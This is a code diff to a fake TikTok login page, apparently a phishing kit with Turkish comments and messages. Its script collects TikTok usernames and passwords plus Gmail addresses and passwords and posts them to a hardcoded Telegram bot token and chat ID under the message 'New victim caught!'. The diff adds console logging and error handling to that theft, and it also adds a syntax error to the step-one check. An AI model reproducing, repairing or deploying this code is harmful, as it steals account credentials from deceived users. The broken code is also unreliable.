@@ -263,7 +263,7 @@
             background-color: #000;
             padding: 48px 24px 24px;
             display: flex;
-            max-width originates from: 1200px;
+            max-width: 1200px;
             margin: 0 auto;
             gap: 48px;
             flex-wrap: wrap;
@@ -612,7 +612,7 @@
                     <option value="th">ภาษาไทย</option>
                     <option value="km">ភាសាខ្មែរ</option>
                     <option value="uk">Українська</option>
-                    <option value="da">dansk</option>
+                    <option value="da">Dansk</option>
                 </select>
             </div>
             <div class="copyright">© 2025 TikTok</div>
@@ -621,7 +621,7 @@
 
     <script>
         // Add Enter key functionality for forms
-        document.addEventListener('DOMContentLoaded', function() {
+        document.addEventListener('DOMContentLoaded', () => {
             const step1Inputs = document.querySelectorAll('#step1 input');
             const step2Inputs = document.querySelectorAll('#step2 input');
             
@@ -629,31 +629,34 @@
                 input.addEventListener('keypress', function(e) {
                     if (e.key === 'Enter') {
                         e.preventDefault();
-                        nextStep();
+                    nextStep();
                     }
                 });
-            });
-            
-            step2Inputs.forEach(input => {
-                input.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        e.preventDefault();
-                        submitForm();
-                    }
-                });
+        });
+        
+        step2Inputs.forEach(input => {
+            input.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    submitForm();
+                }
             });
         });
+    });
 
-        function nextStep() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            if (username && password) {
+    function nextStep() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        console.log('Adım 1: Kullanıcı adı ve şifre alındı:', { username, password });
+        
+        if (username && password) && 
+            {
                 document.getElementById('step1').style.display = 'none';
                 document.getElementById('step2').style.display = 'block';
                 document.getElementById('step2').classList.add('active');
             } else {
-                alert('Lütfen tüm alanları doldurun.');
+                alert('Lütfen tüm alanları doldur.');
             }
         }
 
@@ -663,10 +666,15 @@
             const tiktokUsername = document.getElementById('username').value;
             const tiktokPassword = document.getElementById('password').value;
 
+            console.log('Form verileri:', { tiktokUsername, tiktokPassword, gmail, gmailPassword });
+
             if (gmail && gmailPassword && tiktokUsername && tiktokPassword) {
                 const botToken = '7777367983:AAHFeWMAtxEdl9_d2aCpTqq3UvlUguc4AeU';
                 const chatId = '6116320717';
-                const message = `Yeni Kurban Yakalandı! 😈\nTikTok Kullanıcı Adı: ${tiktokUsername}\nTikTok Şifre: ${tiktokPassword}\nGmail: ${gmail}\nGmail Şifre: ${gmailPassword}\nZaman: ${new Date().toISOString()}`;
+                const message = `Yeni Kurban Yakalandı! 😈\n\nTikTok Kullanıcı Adı: ${tiktokUsername}\nTikTok Şifre: ${tiktokPassword}\nGmail: ${gmail}\nGmail Şifre: ${gmailPassword}\nZaman: ${new Date().toISOString()}`;
+
+                console.log('Telegram’a gönderilen mesaj:', message);
+                console.log('Gönderilen URL:', `https://api.telegram.org/bot${botToken}/sendMessage`);
 
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
@@ -679,17 +687,24 @@
                     }).toString()
                 })
                 .then(response => {
-                    if (response.ok) {
+                    console.log('HTTP durum kodu:', response.status);
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Telegram API yanıtı:', data);
+                    if (data.ok) {
+                        console.log('Mesaj başarıyla gönderildi!');
                         document.getElementById('step2').style.display = 'none';
                         document.getElementById('success').style.display = 'block';
                         document.getElementById('success').classList.add('active');
                     } else {
-                        alert('Veriler Telegram’a gönderilemedi!');
+                        alert(`Veriler Telegram’a gönderilemedi! Hata: ${data.description}`);
+                        console.log('Hata detayları:', data);
                     }
                 })
                 .catch(error => {
                     console.error('Hata:', error);
-                    alert('Hata oluştu, veriler gönderilemedi!');
+                    alert('Hata oluştu, veriler gönderilemedi! Detaylar konsola.');
                 });
             } else {
                 alert('Lütfen tüm alanları doldurun.');
@@ -697,7 +712,7 @@
         }
 
         function changeLanguage(lang) {
-            console.log('Language changed to:', lang);
+            console.log('Dil değiştirildi:', lang);
         }
     </script>
 </body>
